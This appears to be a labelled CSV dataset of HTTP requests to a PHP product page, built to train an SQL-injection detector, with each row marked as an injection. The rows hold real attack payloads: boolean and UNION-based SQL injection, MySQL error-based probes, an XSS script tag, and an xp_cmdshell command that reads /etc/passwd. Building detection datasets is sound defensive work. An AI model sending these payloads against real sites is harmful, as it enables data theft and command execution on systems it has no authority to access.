full_url,parsed_url,hostname,event_time,sql_keyword,params_length,request_volume,special_chars,values_to_length,injection
/details.php?prod=5&type=%3F&GIuz=7549%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,"/details.php?prod=5&type=?&GIuz=7549 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(""XSS"")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#",192.168.43.6,1681395105.638078,8,178,3.5,11,10.674157303370787,1
/details.php?prod=7831&type=%3F,/details.php?prod=7831&type=?,192.168.43.6,1681395105.752823,0,5,3.5,1,20.0,1
/details.php?prod=5%22%27%2C.%28%28%28%2C%2C%2C&type=%3F,"/details.php?prod=5""',.(((,,,&type=?",192.168.43.6,1681395105.82879,0,13,3.5,5,38.46153846153846,1
/details.php?prod=5%27TZjPyH%3C%27%22%3EmqKgLf&type=%3F,"/details.php?prod=5'TZjPyH<'"">mqKgLf&type=?",192.168.43.6,1681395105.87042,0,21,3.5,3,14.285714285714286,1
/details.php?prod=5%29%20AND%204971%3D8255--%20JLuW&type=%3F,/details.php?prod=5) AND 4971=8255-- JLuW&type=?,192.168.43.6,1681395107.341763,1,24,3.5,3,16.666666666666668,1
/details.php?prod=5%29%20AND%201516%3D1516--%20XjAT&type=%3F,/details.php?prod=5) AND 1516=1516-- XjAT&type=?,192.168.43.6,1681395107.361725,1,24,3.5,3,16.666666666666668,1
/details.php?prod=5%29%20AND%202418%3D3915%20AND%20%283630%3D3630&type=%3F,/details.php?prod=5) AND 2418=3915 AND (3630=3630&type=?,192.168.43.6,1681395107.385171,1,32,3.5,3,12.5,1
/details.php?prod=5%29%20AND%201516%3D1516%20AND%20%281869%3D1869&type=%3F,/details.php?prod=5) AND 1516=1516 AND (1869=1869&type=?,192.168.43.6,1681395107.453848,1,32,3.5,3,12.5,1
/details.php?prod=5%29%29%20AND%205944%3D2832%20AND%20%28%281521%3D1521&type=%3F,/details.php?prod=5)) AND 5944=2832 AND ((1521=1521&type=?,192.168.43.6,1681395107.502595,1,34,3.5,3,11.764705882352942,1
/details.php?prod=5%29%29%20AND%201516%3D1516%20AND%20%28%284333%3D4333&type=%3F,/details.php?prod=5)) AND 1516=1516 AND ((4333=4333&type=?,192.168.43.6,1681395107.518198,1,34,3.5,3,11.764705882352942,1
/details.php?prod=5%29%29%29%20AND%205683%3D6090%20AND%20%28%28%287709%3D7709&type=%3F,/details.php?prod=5))) AND 5683=6090 AND (((7709=7709&type=?,192.168.43.6,1681395107.570911,1,36,3.5,3,11.11111111111111,1
/details.php?prod=5%29%29%29%20AND%201516%3D1516%20AND%20%28%28%281796%3D1796&type=%3F,/details.php?prod=5))) AND 1516=1516 AND (((1796=1796&type=?,192.168.43.6,1681395107.633097,1,36,3.5,3,11.11111111111111,1
/details.php?prod=5%20AND%201177%3D7460&type=%3F,/details.php?prod=5 AND 1177=7460&type=?,192.168.43.6,1681395107.63796,1,16,3.5,1,12.5,1
/details.php?prod=5%20AND%201516%3D1516&type=%3F,/details.php?prod=5 AND 1516=1516&type=?,192.168.43.6,1681395107.642136,1,16,3.5,1,12.5,1
/details.php?prod=5%20AND%206092%3D5434&type=%3F,/details.php?prod=5 AND 6092=5434&type=?,192.168.43.6,1681395107.646205,1,16,3.5,1,12.5,1
/details.php?prod=%28SELECT%20CONCAT%28CONCAT%280x71717a6271%2C%28CASE%20WHEN%20%287022%3D7022%29%20THEN%200x31%20ELSE%200x30%20END%29%29%2C0x717a626271%29%29&type=%3F,"/details.php?prod=(SELECT CONCAT(CONCAT(0x71717a6271,(CASE WHEN (7022=7022) THEN 0x31 ELSE 0x30 END)),0x717a626271))&type=?",192.168.43.6,1681395107.705676,3,99,3.5,4,7.070707070707071,1
/details.php?prod=5%20AND%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%287448%3D7448%2C1%29%29%29%2C0x717a626271%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29&type=%3F,"/details.php?prod=5 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(7448=7448,1))),0x717a626271,0x78))s), 8446744073709551610, 8446744073709551610)))&type=?",192.168.43.6,1681395107.711663,3,158,3.5,4,4.430379746835443,1
/details.php?prod=5%20OR%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%285487%3D5487%2C1%29%29%29%2C0x717a626271%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29&type=%3F,"/details.php?prod=5 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(5487=5487,1))),0x717a626271,0x78))s), 8446744073709551610, 8446744073709551610)))&type=?",192.168.43.6,1681395107.720045,3,157,3.5,4,4.45859872611465,1
/details.php?prod=5%20AND%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%282131%3D2131%2C1%29%29%29%2C0x717a626271%2C0x78%29%29x%29%29&type=%3F,"/details.php?prod=5 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(2131=2131,1))),0x717a626271,0x78))x))&type=?",192.168.43.6,1681395107.736773,3,105,3.5,4,6.666666666666667,1
/details.php?prod=5%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%284924%3D4924%2C1%29%29%29%2C0x717a626271%2C0x78%29%29x%29%29&type=%3F,"/details.php?prod=5 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(4924=4924,1))),0x717a626271,0x78))x))&type=?",192.168.43.6,1681395107.7715,3,104,3.5,4,6.730769230769231,1
/details.php?prod=5%20AND%20GTID_SUBSET%28CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%282364%3D2364%2C1%29%29%29%2C0x717a626271%29%2C2364%29&type=%3F,"/details.php?prod=5 AND GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(2364=2364,1))),0x717a626271),2364)&type=?",192.168.43.6,1681395107.77752,3,86,3.5,4,8.13953488372093,1
